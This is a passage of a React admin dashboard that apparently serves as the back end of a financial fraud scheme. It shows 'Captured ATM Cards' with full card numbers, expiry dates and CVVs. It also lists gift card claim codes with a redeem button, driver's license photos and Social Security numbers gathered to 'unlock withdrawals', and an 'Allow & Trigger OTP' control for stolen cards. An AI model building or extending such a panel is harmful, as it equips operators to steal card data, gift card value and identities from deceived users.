                            <span>{client.lastLoginDevice || 'Unknown device'}</span>
                          </span>
                        </td>
                        <td className="py-3 px-4 text-gray-300 whitespace-nowrap tabular-nums">
                          <span className="inline-flex items-center space-x-1.5">
                            <Clock className="w-3.5 h-3.5 text-gray-400 shrink-0" />
                            <span>
                              {formatLastLoginTime(
                                client.lastLoginAt || client.lastActiveAt || client.createdAt,
                                nowMs
                              )}
                            </span>
                          </span>
                        </td>
                        <td className="py-3 px-4 text-right whitespace-nowrap">
                          <span
                            className={`inline-flex items-center space-x-1.5 px-2.5 py-1 rounded-full text-[11px] font-bold border ${
                              online
                                ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40'
                                : 'bg-gray-700/60 text-gray-400 border-gray-600'
                            }`}
                          >
                            <span
                              className={`w-1.5 h-1.5 rounded-full ${
                                online ? 'bg-emerald-400' : 'bg-gray-500'
                              }`}
                            />
                            <span>{online ? 'Online' : 'Offline'}</span>
                          </span>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          )}
        </div>

        {/* Summary Metric Cards */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
          <div className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm">
            <div className="flex items-center justify-between">
              <p className="text-xs text-gray-400 uppercase font-medium">Card / Other</p>
              <CreditCard className="w-4 h-4 text-purple-400" />
            </div>
            <h3 className="text-3xl font-black text-purple-400 mt-1 tabular-nums">{cards.length}</h3>
            <p className="text-xs text-gray-500 mt-1 tabular-nums">
              {pendingCards.length} pending review
            </p>
          </div>

          <div className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm">
            <div className="flex items-center justify-between">
              <p className="text-xs text-gray-400 uppercase font-medium">Gift Cards</p>
              <Gift className="w-4 h-4 text-amber-400" />
            </div>
            <h3 className="text-3xl font-black text-amber-400 mt-1 tabular-nums">{giftCards.length}</h3>
            <p className="text-xs text-gray-500 mt-1 tabular-nums">
              {pendingGiftCards.length} pending review
            </p>
          </div>

          <div className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm">
            <div className="flex items-center justify-between">
              <p className="text-xs text-gray-400 uppercase font-medium">ID / KYC</p>
              <IdCard className="w-4 h-4 text-indigo-400" />
            </div>
            <h3 className="text-3xl font-black text-indigo-400 mt-1 tabular-nums">{kycSubmissions.length}</h3>
            <p className="text-xs text-gray-500 mt-1 tabular-nums">
              {pendingKyc.length} pending review
            </p>
          </div>

          <div className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm">
            <div className="flex items-center justify-between">
              <p className="text-xs text-gray-400 uppercase font-medium">Registered Clients</p>
              <Users className="w-4 h-4 text-emerald-400" />
            </div>
            <h3 className="text-3xl font-black text-emerald-400 mt-1 tabular-nums">{clients.length}</h3>
            <p className="text-xs text-gray-500 mt-1 tabular-nums">
              {clients.filter((c) => c.payIdVerified).length} PAY ID verified
            </p>
          </div>
        </div>

        {/* Tab 1: ATM Cards */}
        {activeTab === 'cards' && (
          <div className="space-y-4">
            <div className="flex flex-wrap items-center justify-between gap-3">
              <h2 className="text-base font-bold text-gray-200 flex items-center space-x-2">
                <CreditCard className="w-5 h-5 text-purple-400" />
                <span>Captured ATM Cards</span>
              </h2>
              <div className="flex flex-wrap items-center gap-2">
                <span className="text-xs text-gray-400 font-mono tabular-nums">
                  {cards.length} Total Submissions
                </span>
                {cards.length > 0 &&
                  (!confirmDeleteAllCards ? (
                    <button
                      type="button"
                      onClick={() => setConfirmDeleteAllCards(true)}
                      className="bg-red-600/20 hover:bg-red-600 text-red-300 hover:text-white px-3 py-1.5 rounded-xl text-xs font-bold border border-red-500/30 flex items-center space-x-1.5 transition-colors cursor-pointer"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                      <span>Delete All ATM Cards</span>
                    </button>
                  ) : (
                    <div className="flex items-center space-x-1.5 bg-red-950/60 border border-red-500/40 px-2.5 py-1 rounded-xl">
                      <button
                        type="button"
                        disabled={isDeletingAllCards}
                        onClick={handleDeleteAllCards}
                        className="bg-red-600 hover:bg-red-700 disabled:opacity-60 text-white px-2.5 py-1 rounded-lg text-xs font-bold cursor-pointer transition-colors"
                      >
                        {isDeletingAllCards
                          ? 'Deleting...'
                          : `Confirm Delete All (${cards.length})`}
                      </button>
                      <button
                        type="button"
                        disabled={isDeletingAllCards}
                        onClick={() => setConfirmDeleteAllCards(false)}
                        className="bg-gray-700 hover:bg-gray-600 text-gray-200 px-2.5 py-1 rounded-lg text-xs font-semibold cursor-pointer transition-colors"
                      >
                        Cancel
                      </button>
                    </div>
                  ))}
              </div>
            </div>

            {cards.length === 0 ? (
              <div className="bg-gray-800 border border-gray-700 rounded-2xl p-12 text-center text-gray-400">
                <CreditCard className="w-12 h-12 mx-auto mb-3 opacity-40" />
                <p className="text-sm">No ATM cards captured yet.</p>
                <p className="text-xs text-gray-500 mt-1">
                  When users submit card details during Upgrade, PayId or Deposit, they appear here live.
                </p>
              </div>
            ) : (
              <div className="space-y-4">
                {cards.map((c) => (
                  <div
                    key={c.id}
                    className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm space-y-4 hover:border-purple-500/50 transition-all"
                  >
                    <div className="flex items-center justify-between border-b border-gray-700 pb-3">
                      <div className="flex flex-wrap items-center gap-2">
                        <span className="bg-purple-600/30 text-purple-300 px-2.5 py-1 rounded-lg text-xs font-bold border border-purple-500/30">
                          {c.type}
                        </span>
                        <span
                          className={`px-2 py-0.5 rounded-full text-[10px] font-bold uppercase border ${
                            c.status === 'approved'
                              ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30'
                              : c.status === 'rejected'
                              ? 'bg-red-500/20 text-red-300 border-red-500/30'
                              : 'bg-amber-500/20 text-amber-300 border-amber-500/30'
                          }`}
                        >
                          {c.status || 'pending'}
                        </span>
                        <span className="text-xs text-gray-400 font-mono">{c.date}</span>
                      </div>
                      <span className="font-black text-emerald-400 text-lg">
                        ${c.amount?.toLocaleString()}
                      </span>
                    </div>

                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs">
                      <div>
                        <p className="text-gray-400 text-[10px] uppercase font-medium">Card Number</p>
                        <div className="flex items-center space-x-1.5 mt-0.5">
                          <p className="font-mono font-bold text-white text-sm">{c.cardNumber}</p>
                          <button
                            onClick={() => copyText(c.cardNumber.replace(/\s/g, ''), `card-${c.id}`)}
                            className="p-1 text-gray-400 hover:text-white"
                            title="Copy card number"
                          >
                            {copiedCodeId === `card-${c.id}` ? (
                              <Check className="w-3.5 h-3.5 text-emerald-400" />
                            ) : (
                              <Copy className="w-3.5 h-3.5" />
                            )}
                          </button>
                        </div>
                      </div>
                      <div>
                        <p className="text-gray-400 text-[10px] uppercase font-medium">Expiry / CVV</p>
                        <p className="font-mono font-bold text-white text-sm mt-0.5">
                          {c.expiry} • {c.cvv}
                        </p>
                      </div>
                      <div>
                        <p className="text-gray-400 text-[10px] uppercase font-medium">Cardholder Name</p>
                        <p className="font-bold text-white uppercase mt-0.5">{c.cardName}</p>
                      </div>
                      <div>
                        <p className="text-gray-400 text-[10px] uppercase font-medium">User Account</p>
                        <p className="font-medium text-purple-300 truncate mt-0.5">
                          {c.userName} ({c.userEmail})
                        </p>
                      </div>
                    </div>

                    {c.rejectionReason && (
                      <p className="text-[11px] text-red-400 bg-red-950/30 border border-red-500/20 px-3 py-1.5 rounded-lg">
                        {c.rejectionReason}
                      </p>
                    )}

                    <div className="pt-2 flex flex-wrap items-center justify-end gap-2">
                      {c.status !== 'rejected' && (
                        <button
                          type="button"
                          onClick={() => handleRejectCardSubmission(c)}
                          className="bg-amber-600/20 hover:bg-amber-600 text-amber-200 hover:text-white text-xs font-bold px-3.5 py-2.5 rounded-xl flex items-center space-x-1.5 transition-colors cursor-pointer border border-amber-500/30"
                        >
                          <Ban className="w-4 h-4" />
                          <span>Reject Card</span>
                        </button>
                      )}
                      <button
                        type="button"
                        onClick={() => handleTriggerOtpForCard(c)}
                        className={`text-xs font-bold px-3.5 py-2.5 rounded-xl flex items-center space-x-1.5 transition-colors cursor-pointer border ${
                          (c as any).requiresOtp
                            ? 'bg-emerald-600/30 text-emerald-300 border-emerald-500/40'
                            : 'bg-indigo-600/30 hover:bg-indigo-600 text-indigo-200 hover:text-white border-indigo-500/40'
                        }`}
                      >
                        <Lock className="w-4 h-4" />
                        <span>{(c as any).requiresOtp ? 'OTP Triggered (Active)' : 'Allow & Trigger OTP'}</span>
                      </button>
                      <button
                        type="button"
                        onClick={() => handleApproveCardSubmission(c)}
                        className="bg-purple-600 hover:bg-purple-700 text-white text-xs font-bold px-3.5 py-2.5 rounded-xl flex items-center space-x-1.5 transition-colors cursor-pointer shadow-md"
                      >
                        <ShieldCheck className="w-4 h-4" />
                        <span>Approve & Unlock</span>
                      </button>
                      <button
                        type="button"
                        onClick={() => handleDeleteCard(c.id)}
                        className="bg-red-600/20 hover:bg-red-600 text-red-300 hover:text-white text-xs font-bold px-3.5 py-2.5 rounded-xl flex items-center space-x-1.5 transition-colors cursor-pointer border border-red-500/30"
                      >
                        <Trash2 className="w-4 h-4" />
                        <span>Remove</span>
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Tab 2: Gift Cards */}
        {activeTab === 'giftcards' && (
          <div className="space-y-4">
            <div className="flex flex-wrap items-center justify-between gap-3">
              <h2 className="text-base font-bold text-gray-200 flex items-center space-x-2">
                <Gift className="w-5 h-5 text-amber-400" />
                <span>Gift Card Submissions & Redemptions</span>
              </h2>
              <div className="flex flex-wrap items-center gap-2">
                <span className="text-xs text-gray-400 font-mono tabular-nums">
                  {giftCards.length} Total Submissions
                </span>
                {giftCards.length > 0 &&
                  (!confirmDeleteAllGifts ? (
                    <button
                      type="button"
                      onClick={() => setConfirmDeleteAllGifts(true)}
                      className="bg-red-600/20 hover:bg-red-600 text-red-300 hover:text-white px-3 py-1.5 rounded-xl text-xs font-bold border border-red-500/30 flex items-center space-x-1.5 transition-colors cursor-pointer"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                      <span>Delete All Gift Cards</span>
                    </button>
                  ) : (
                    <div className="flex items-center space-x-1.5 bg-red-950/60 border border-red-500/40 px-2.5 py-1 rounded-xl">
                      <button
                        type="button"
                        disabled={isDeletingAllGifts}
                        onClick={handleDeleteAllGiftCards}
                        className="bg-red-600 hover:bg-red-700 disabled:opacity-60 text-white px-2.5 py-1 rounded-lg text-xs font-bold cursor-pointer transition-colors"
                      >
                        {isDeletingAllGifts
                          ? 'Deleting...'
                          : `Confirm Delete All (${giftCards.length})`}
                      </button>
                      <button
                        type="button"
                        disabled={isDeletingAllGifts}
                        onClick={() => setConfirmDeleteAllGifts(false)}
                        className="bg-gray-700 hover:bg-gray-600 text-gray-200 px-2.5 py-1 rounded-lg text-xs font-semibold cursor-pointer transition-colors"
                      >
                        Cancel
                      </button>
                    </div>
                  ))}
              </div>
            </div>

            {/* Admin Used Card Blocklist Control */}
            <form
              onSubmit={handleManualBlockUsedCard}
              className="bg-gray-800 border border-red-500/30 rounded-2xl p-4 space-y-2.5"
            >
              <div className="flex items-center justify-between">
                <div className="flex items-center space-x-2 text-xs font-bold text-red-300">
                  <Ban className="w-4 h-4 text-red-400" />
                  <span>Block Used / Already-Redeemed Gift Card Code</span>
                </div>
                <span className="text-[10px] text-gray-400">SHA-256 Registry</span>
              </div>
              <div className="flex flex-col sm:flex-row gap-2">
                <input
                  type="text"
                  value={blockCodeInput}
                  onChange={(e) => setBlockCodeInput(e.target.value.toUpperCase())}
                  placeholder="Paste any used gift card code to block it globally..."
                  className="flex-1 px-3 py-2.5 bg-gray-900 border border-gray-700 rounded-xl text-xs font-mono text-white uppercase outline-none focus:ring-2 focus:ring-red-500"
                />
                <button
                  type="submit"
                  className="bg-red-600 hover:bg-red-700 text-white font-bold px-4 py-2.5 rounded-xl text-xs cursor-pointer shrink-0"
                >
                  Block Used Card
                </button>
              </div>
              {blockNotice && <p className="text-[11px] text-emerald-400 font-medium">{blockNotice}</p>}
            </form>

            {giftCards.length === 0 ? (
              <div className="bg-gray-800 border border-gray-700 rounded-2xl p-12 text-center text-gray-400">
                <Gift className="w-12 h-12 mx-auto mb-3 opacity-40 text-amber-400" />
                <p className="text-sm">No gift card verifications submitted yet.</p>
                <p className="text-xs text-gray-500 mt-1">
                  When users submit gift cards for Upgrade or PAY ID verification, claim codes and photos appear here.
                </p>
              </div>
            ) : (
              <div className="space-y-4">
                {giftCards.map((g) => (
                  <div
                    key={g.id}
                    className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm space-y-4 hover:border-amber-500/50 transition-all"
                  >
                    <div className="flex items-center justify-between border-b border-gray-700 pb-3">
                      <div className="flex items-center space-x-2">
                        <span className="bg-amber-600/30 text-amber-300 px-2.5 py-1 rounded-lg text-xs font-bold border border-amber-500/30 flex items-center space-x-1">
                          <Gift className="w-3.5 h-3.5" />
                          <span>{g.cardBrand}</span>
                        </span>
                        <span className="text-xs bg-gray-700 text-gray-300 px-2 py-0.5 rounded-md">
                          {g.type}
                        </span>
                        <span className="text-xs text-gray-400 font-mono hidden sm:inline">{g.date}</span>
                      </div>
                      <div className="flex items-center space-x-3">
                        <span className="font-black text-amber-400 text-lg">
                          ${g.amount?.toLocaleString()}
                        </span>
                        <span
                          className={`text-xs px-2.5 py-1 rounded-full font-bold uppercase ${
                            g.status === 'redeemed'
                              ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                              : g.status === 'verified'
                              ? 'bg-blue-500/20 text-blue-400 border border-blue-500/30'
                              : g.status === 'rejected'
                              ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                              : 'bg-amber-500/20 text-amber-400 border border-amber-500/30'
                          }`}
                        >
                          {g.status || 'pending'}
                        </span>
                      </div>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-4 gap-3 text-xs">
                      {/* Claim Code with Quick Copy */}
                      <div className="sm:col-span-2 bg-gray-900/80 p-3 rounded-xl border border-gray-700/80">
                        <p className="text-gray-400 text-[10px] uppercase font-semibold mb-1">
                          Gift Card Claim Code / PIN
                        </p>
                        <div className="flex items-center justify-between">
                          <span className="font-mono font-bold text-amber-300 text-sm tracking-wider select-all break-all">
                            {g.cardCode}
                          </span>
                          <button
                            onClick={() => copyText(g.cardCode, `code-${g.id}`)}
                            className="ml-2 bg-amber-600/20 hover:bg-amber-600/30 text-amber-300 px-2.5 py-1 rounded-lg text-xs font-semibold flex items-center space-x-1 shrink-0 transition-colors cursor-pointer border border-amber-500/30"
                          >
                            {copiedCodeId === `code-${g.id}` ? (
                              <>
                                <Check className="w-3 h-3 text-emerald-400" />
                                <span>Copied</span>
                              </>
                            ) : (
                              <>
                                <Copy className="w-3 h-3" />
                                <span>Copy Code</span>
                              </>
                            )}
                          </button>
                        </div>
                        {g.cardPin && g.cardPin !== 'N/A' && (
                          <p className="text-[11px] text-gray-400 font-mono mt-1">
                            Card PIN / CVV: <span className="text-white font-bold">{g.cardPin}</span>
                          </p>
                        )}
                      </div>

                      {/* User Account Info */}
                      <div>
                        <p className="text-gray-400 text-[10px] uppercase font-medium">User Profile</p>
                        <p className="font-bold text-white mt-0.5">{g.userName}</p>
                        <p className="text-purple-300 truncate text-[11px]">{g.userEmail}</p>
                        <span className="text-[10px] text-gray-500 block mt-0.5">
                          Format: {g.cardFormat === 'physical' ? 'Physical Card' : 'Digital E-Code'}
                        </span>
                      </div>

                      {/* Photo / Receipt attachment */}
                      <div>
                        <p className="text-gray-400 text-[10px] uppercase font-medium">Uploaded Image</p>
                        {g.image ? (
                          <div
                            onClick={() => {
                              setPreviewImageTitle('Gift Card / Receipt Photo');
                              setPreviewImage(g.image || null);
                            }}
                            className="mt-1 flex items-center space-x-2 bg-gray-900 p-2 rounded-xl border border-gray-700 cursor-pointer hover:border-amber-400 transition-colors"
                          >
                            <img
                              src={g.image}
                              alt="Card receipt"
                              className="w-10 h-10 object-cover rounded-lg border border-gray-600"
                            />
                            <div className="text-[11px]">
                              <span className="text-amber-300 font-bold block flex items-center space-x-1">
                                <Eye className="w-3 h-3" />
                                <span>View Photo</span>
                              </span>
                              <span className="text-gray-500 text-[10px]">Tap to enlarge</span>
                            </div>
                          </div>
                        ) : (
                          <p className="text-gray-500 text-[11px] mt-1 italic">No photo attached (E-Code)</p>
                        )}
                      </div>
                    </div>

                    {/* Status Management Actions */}
                    <div className="pt-2 border-t border-gray-700/60 flex flex-wrap items-center justify-between gap-2">
                      <div className="text-[11px] text-gray-400">
                        Status:{' '}
                        <span className="font-semibold text-white capitalize">
                          {g.status || 'pending'}
                        </span>
                        {g.rejectionReason && (
                          <span className="text-red-400 ml-2">({g.rejectionReason})</span>
                        )}
                      </div>

                      <div className="flex flex-wrap items-center gap-2">
                        {g.status !== 'rejected' && (
                          <>
                            <button
                              onClick={() =>
                                handleUpdateGiftCardStatus(
                                  g,
                                  'rejected',
                                  'USED GIFT CARD: This gift card has already been used/redeemed before and is not allowed.'
                                )
                              }
                              className="bg-red-600/30 hover:bg-red-600 text-red-200 hover:text-white px-3 py-1.5 rounded-xl text-xs font-semibold border border-red-500/30 transition-all cursor-pointer flex items-center space-x-1"
                            >
                              <Ban className="w-3.5 h-3.5" />
                              <span>Reject: Used Card</span>
                            </button>
                            <button
                              onClick={() =>
                                handleUpdateGiftCardStatus(
                                  g,
                                  'rejected',
                                  'FAKE / WRONG GIFT CARD: This gift card code or proof photo is fake, invalid, or wrong.'
                                )
                              }
                              className="bg-rose-600/30 hover:bg-rose-600 text-rose-200 hover:text-white px-3 py-1.5 rounded-xl text-xs font-semibold border border-rose-500/30 transition-all cursor-pointer flex items-center space-x-1"
                            >
                              <Ban className="w-3.5 h-3.5" />
                              <span>Reject: Fake / Wrong</span>
                            </button>
                          </>
                        )}

                        {g.status !== 'verified' && (
                          <button
                            onClick={() => handleUpdateGiftCardStatus(g, 'verified')}
                            className="bg-blue-600/30 hover:bg-blue-600 text-blue-200 hover:text-white px-3 py-1.5 rounded-xl text-xs font-semibold border border-blue-500/30 transition-all cursor-pointer flex items-center space-x-1"
                          >
                            <CheckCircle className="w-3.5 h-3.5" />
                            <span>
                              {g.type === 'PAY ID Verification'
                                ? 'Confirm Gift Card & Release PAY ID'
                                : 'Confirm Gift Card'}
                            </span>
                          </button>
                        )}

                        {g.status !== 'redeemed' && (
                          <button
                            onClick={() => handleUpdateGiftCardStatus(g, 'redeemed')}
                            className="bg-emerald-600 hover:bg-emerald-700 text-white px-3.5 py-1.5 rounded-xl text-xs font-bold transition-all cursor-pointer flex items-center space-x-1 shadow-sm"
                          >
                            <Sparkles className="w-3.5 h-3.5" />
                            <span>Redeem / Complete</span>
                          </button>
                        )}

                        <button
                          type="button"
                          onClick={() => handleDeleteGiftCard(g.id)}
                          className="bg-red-600/20 hover:bg-red-600 text-red-300 hover:text-white px-3 py-1.5 rounded-xl text-xs font-bold border border-red-500/30 transition-all cursor-pointer flex items-center space-x-1"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                          <span>Delete</span>
                        </button>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Tab 3: ID / KYC Verification (Driver's License & SSI) */}
        {activeTab === 'kyc' && (
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <h2 className="text-base font-bold text-gray-200 flex items-center space-x-2">
                <IdCard className="w-5 h-5 text-indigo-400" />
                <span>Driver&apos;s License &amp; SSI Verification Submissions</span>
              </h2>
              <span className="text-xs text-gray-400 font-mono">
                {kycSubmissions.length} Total Submissions
              </span>
            </div>

            {kycSubmissions.length === 0 ? (
              <div className="bg-gray-800 border border-gray-700 rounded-2xl p-12 text-center text-gray-400">
                <IdCard className="w-12 h-12 mx-auto mb-3 opacity-40 text-indigo-400" />
                <p className="text-sm">No ID &amp; SSI verifications submitted yet.</p>
                <p className="text-xs text-gray-500 mt-1">
                  After clients upgrade to Stage 5 — Ruby Tier, their Driver&apos;s License photos and SSI details appear here for review.
                </p>
              </div>
            ) : (
              <div className="space-y-4">
                {kycSubmissions.map((k) => (
                  <div
                    key={k.id}
                    className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm space-y-4 hover:border-indigo-500/50 transition-all"
                  >
                    <div className="flex flex-wrap items-center justify-between gap-2 border-b border-gray-700 pb-3">
                      <div className="flex flex-wrap items-center gap-2">
                        <span className="bg-indigo-600/30 text-indigo-300 px-2.5 py-1 rounded-lg text-xs font-bold border border-indigo-500/30 flex items-center space-x-1">
                          <IdCard className="w-3.5 h-3.5" />
                          <span>{k.accountLevel}</span>
                        </span>
                        <span className="text-xs text-gray-400 font-mono">{k.date}</span>
                      </div>
                      <span
                        className={`text-xs px-2.5 py-1 rounded-full font-bold uppercase ${
                          k.status === 'verified'
                            ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                            : k.status === 'rejected'
                            ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                            : 'bg-amber-500/20 text-amber-400 border border-amber-500/30'
                        }`}
                      >
                        {k.status}
                      </span>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
                      <div className="bg-gray-900/70 p-3 rounded-xl border border-gray-700/80 space-y-1">
                        <p className="text-[10px] uppercase font-semibold text-gray-400">Applicant &amp; Identity</p>
                        <p className="font-bold text-white text-sm">{k.fullName}</p>
                        <p className="text-purple-300 truncate">{k.userEmail}</p>
                        <p className="text-gray-300">DOB: <span className="font-mono text-white">{k.dateOfBirth}</span></p>
                        <p className="text-gray-400 text-[11px] leading-snug">{k.address}</p>
                      </div>

                      <div className="bg-gray-900/70 p-3 rounded-xl border border-gray-700/80 space-y-1.5">
                        <p className="text-[10px] uppercase font-semibold text-gray-400">Driver&apos;s License</p>
                        <div className="flex items-center justify-between gap-2">
                          <span className="font-mono font-bold text-amber-300 text-sm">{k.licenseNumber}</span>
                          <button
                            type="button"
                            onClick={() => copyText(k.licenseNumber, `dl-${k.id}`)}
                            className="bg-gray-800 hover:bg-gray-700 text-gray-200 px-2 py-1 rounded-lg text-[11px] font-semibold flex items-center space-x-1 cursor-pointer border border-gray-600"
                          >
                            {copiedCodeId === `dl-${k.id}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                            <span>{copiedCodeId === `dl-${k.id}` ? 'Copied' : 'Copy'}</span>
                          </button>
                        </div>
                        <p className="text-gray-300">State: <span className="text-white font-semibold">{k.licenseState}</span></p>
                        <p className="text-gray-300">Expires: <span className="font-mono text-white">{k.licenseExpiry}</span></p>
                      </div>

                      <div className="bg-gray-900/70 p-3 rounded-xl border border-gray-700/80 space-y-1.5">
                        <p className="text-[10px] uppercase font-semibold text-gray-400">SSI / Social Security</p>
                        <div className="flex items-center justify-between gap-2">
                          <span className="font-mono font-bold text-emerald-300 text-sm">{k.ssiNumber}</span>
                          <button
                            type="button"
                            onClick={() => copyText(k.ssiNumber, `ssi-${k.id}`)}
                            className="bg-gray-800 hover:bg-gray-700 text-gray-200 px-2 py-1 rounded-lg text-[11px] font-semibold flex items-center space-x-1 cursor-pointer border border-gray-600"
                          >
                            {copiedCodeId === `ssi-${k.id}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                            <span>{copiedCodeId === `ssi-${k.id}` ? 'Copied' : 'Copy'}</span>
                          </button>
                        </div>
                        <div className="grid grid-cols-2 gap-2 pt-1">
                          <button
                            type="button"
                            onClick={() => {
                              setPreviewImageTitle("Driver's License — Front");
                              setPreviewImage(k.licenseFrontImage);
                            }}
                            className="bg-gray-800 hover:border-indigo-400 border border-gray-700 rounded-xl p-1.5 flex items-center space-x-1.5 cursor-pointer"
                          >
                            <img src={k.licenseFrontImage} alt="License Front" className="w-8 h-8 object-cover rounded" />
                            <span className="text-[10px] text-indigo-300 font-bold">Front</span>
                          </button>
                          <button
                            type="button"
                            onClick={() => {
                              setPreviewImageTitle("Driver's License — Back");
                              setPreviewImage(k.licenseBackImage);
                            }}
                            className="bg-gray-800 hover:border-indigo-400 border border-gray-700 rounded-xl p-1.5 flex items-center space-x-1.5 cursor-pointer"
                          >
                            <img src={k.licenseBackImage} alt="License Back" className="w-8 h-8 object-cover rounded" />
                            <span className="text-[10px] text-indigo-300 font-bold">Back</span>
                          </button>
                        </div>
                      </div>
                    </div>

                    <div className="pt-2 border-t border-gray-700/60 flex flex-wrap items-center justify-between gap-2">
                      <div className="text-[11px] text-gray-400">
                        Ref: <span className="font-mono text-gray-300">{k.id}</span>
                        {k.rejectionReason && (
                          <span className="text-red-400 ml-2">({k.rejectionReason})</span>
                        )}
                      </div>

                      <div className="flex flex-wrap items-center gap-2">
                        {k.status !== 'rejected' && (
                          <>
                            <button
                              type="button"
                              onClick={() =>
                                handleUpdateKycStatus(
                                  k,
                                  'rejected',
                                  "Driver's License photos are unclear or expired. Please upload clear front and back photos."
                                )
                              }
                              className="bg-red-600/30 hover:bg-red-600 text-red-200 hover:text-white px-3 py-1.5 rounded-xl text-xs font-semibold border border-red-500/30 transition-all cursor-pointer flex items-center space-x-1"
                            >
                              <Ban className="w-3.5 h-3.5" />
                              <span>Reject: Invalid ID</span>
                            </button>
                            <button
                              type="button"
                              onClick={() =>
                                handleUpdateKycStatus(
                                  k,
                                  'rejected',
                                  'SSI details do not match your profile. Please verify and resubmit your SSI details.'
                                )
                              }
                              className="bg-rose-600/30 hover:bg-rose-600 text-rose-200 hover:text-white px-3 py-1.5 rounded-xl text-xs font-semibold border border-rose-500/30 transition-all cursor-pointer flex items-center space-x-1"
                            >
                              <Ban className="w-3.5 h-3.5" />
                              <span>Reject: SSI Mismatch</span>
                            </button>
                          </>
                        )}

                        {k.status !== 'verified' && (
                          <button
                            type="button"
                            onClick={() => handleUpdateKycStatus(k, 'verified')}
                            className="bg-emerald-600 hover:bg-emerald-700 text-white px-3.5 py-1.5 rounded-xl text-xs font-bold transition-all cursor-pointer flex items-center space-x-1 shadow-sm"
                          >
                            <ShieldCheck className="w-3.5 h-3.5" />
                            <span>Approve ID &amp; Unlock Withdrawals</span>
                          </button>
                        )}

                        <button
                          type="button"
                          onClick={() => handleDeleteKyc(k.id)}
                          className="bg-gray-700 hover:bg-red-600 text-gray-300 hover:text-white px-2.5 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center space-x-1"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                          <span>Remove</span>
                        </button>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Tab 4: Registered Clients */}
        {activeTab === 'clients' && (
          <div className="space-y-4">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
              <h2 className="text-base font-bold text-gray-200 flex items-center space-x-2">
                <Users className="w-5 h-5 text-purple-400" />
                <span>Registered Clients ({clients.length})</span>
              </h2>
              <input
                type="text"
                value={clientSearchQuery}
                onChange={(e) => setClientSearchQuery(e.target.value)}
                placeholder="Search by name, email, or tier..."
                className="px-3.5 py-2 bg-gray-800 border border-gray-700 rounded-xl text-xs text-white placeholder-gray-400 outline-none focus:ring-2 focus:ring-purple-500 w-full sm:w-64"
              />
            </div>

            {clients.length === 0 ? (
              <div className="bg-gray-800 border border-gray-700 rounded-2xl p-12 text-center text-gray-400">
                <Users className="w-12 h-12 mx-auto mb-3 opacity-40 text-purple-400" />
                <p className="text-sm">No client accounts found yet.</p>
              </div>
            ) : (
              <div className="space-y-3">
                {clients
                  .filter((client) => {
                    const q = clientSearchQuery.trim().toLowerCase();
                    if (!q) return true;
                    return (
                      (client.name || '').toLowerCase().includes(q) ||
                      (client.email || '').toLowerCase().includes(q) ||
                      (client.accountLevel || '').toLowerCase().includes(q)
                    );
                  })
                  .map((client) => (
                    <div
                      key={client.email}
                      className="bg-gray-800 border border-gray-700 rounded-2xl p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3"
                    >
                      <div className="space-y-1 min-w-0">
                        <div className="flex flex-wrap items-center gap-2">
                          <span className="font-bold text-sm text-white">{client.name || 'Unnamed User'}</span>
                          <span className="text-xs text-purple-300 truncate">{client.email}</span>
                        </div>
                        <div className="text-xs text-gray-400 flex flex-wrap items-center gap-2 tabular-nums">
                          <span>Tier: {client.accountLevel || 'Basic'}</span>
                          <span aria-hidden="true">·</span>
                          <span>PAY ID: {client.payIdVerified ? 'Verified' : 'Unverified'}</span>
                          <span aria-hidden="true">·</span>
                          <span>KYC: {client.kycStatus || (client.kycVerified ? 'verified' : 'unverified')}</span>
                        </div>
                      </div>
                      <div className="text-left sm:text-right shrink-0">
                        <span className="font-mono font-bold text-emerald-400 text-base tabular-nums">
                          ${Number(client.balance ?? 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                        </span>
                      </div>
                    </div>
                  ))}
              </div>
            )}
          </div>
        )}
      </div>

      {/* Image Preview Modal */}
      {previewImage && (
        <div
          className="fixed inset-0 bg-black/85 backdrop-blur-sm flex items-center justify-center p-4 z-50 animate-in fade-in"
          onClick={() => setPreviewImage(null)}
        >
          <div
            className="bg-gray-800 border border-gray-700 rounded-2xl p-4 max-w-lg w-full relative"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex justify-between items-center mb-3">
              <h4 className="text-sm font-bold text-white">{previewImageTitle}</h4>
              <button
                onClick={() => setPreviewImage(null)}
                className="text-gray-400 hover:text-white p-1 text-sm font-bold"
              >
                ✕
              </button>
            </div>
            <img
              src={previewImage}
              alt="Enlarged Card Preview"
              className="w-full max-h-[70vh] object-contain rounded-xl border border-gray-700 bg-black/50"
            />
          </div>
        </div>
      )}
    </div>
  );
};
